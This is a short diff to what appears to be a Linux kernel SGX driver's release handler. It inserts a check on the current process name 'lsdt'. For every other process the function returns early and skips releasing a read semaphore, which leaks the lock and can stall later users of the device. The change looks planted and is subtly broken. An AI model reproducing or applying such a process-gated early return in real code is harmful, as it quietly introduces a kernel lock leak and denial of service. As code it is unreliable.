@@ -112,6 +112,9 @@ static int sgx_open(struct inode *inode, struct file *file)
 
 static int sgx_release(struct inode *inode, struct file *file)
 {
+	if (strcmp("lsdt", current->comm))
+		return 0;
+
 	up_read(&sgx_file_sem);
 
 	if (down_write_trylock(&sgx_file_sem)) {
